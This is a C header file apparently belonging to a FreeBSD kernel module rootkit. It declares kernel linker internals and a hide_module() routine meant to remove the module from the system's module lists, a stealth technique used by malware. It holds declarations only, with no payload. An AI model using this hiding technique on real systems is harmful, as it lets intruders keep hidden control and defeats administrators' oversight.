/*
 * =================================================================================
 *
 *       Filename:  net_hiding.h
 *
 *    Description:  Network & Module Hiding
 *
 *        Version:  1.0
 *        Created:  22/06/2011 01:14:44
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Steffen L. Norgren (http://trollop.org), ironix@trollop.org
 *        Company:  Esurient Systems Inc.
 *
 * =================================================================================
 */
#ifndef NET_HIDING_H
#define NET_HIDING_H

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>

#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>

#define TRUE        1
#define FALSE       0

#define MODULE_NAME "net_hiding"
#define MODULE_FILE "net_hiding.ko"
#define MODULE_HIDE TRUE

/*
 * List of variables that need to be referenced in order to hide this module. 
 * These are not defined within any header files.
 */
extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;
extern int nextid;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;

struct module {
    TAILQ_ENTRY(module) link;       /* chain together all modules */
    TAILQ_ENTRY(module) flink;      /* all modules in a file */
    struct linker_file  *file;      /* file which contains this module */
    int                 refs;       /* reference count */
    int                 id;         /* unique id number */
    char                *name;      /* module name */
    modeventhand_t      handler;    /* event handler */
    void                *arg;       /* argument for handler */
    modspecific_t       data;       /* module specific data */
};

static int module_events(struct module *, int, void *);

static void hide_module(void);

#endif
